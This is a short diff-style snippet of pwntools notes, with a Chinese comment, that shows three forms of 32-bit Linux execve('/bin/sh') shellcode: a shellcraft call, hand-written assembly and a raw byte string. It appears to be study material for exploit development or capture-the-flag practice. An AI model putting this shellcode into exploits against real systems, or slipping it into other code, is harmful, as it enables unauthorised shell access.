@@ -1,0 +1,15 @@
+from pwn import *
+shellcode=shellcraft.sh()
+注：这只是最简单的shellcode，由于x32和x64的shellcode,使用之前最好先设置一下context
+
+shellcode=asm('''
+    mov eax, 0xb
+	  mov ecx, 0
+	  mov edx, 0
+	  push 0x68732f
+	  push 0x6e69622f
+	  mov ebx, esp
+	  int 0x80
+''')
+
+shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
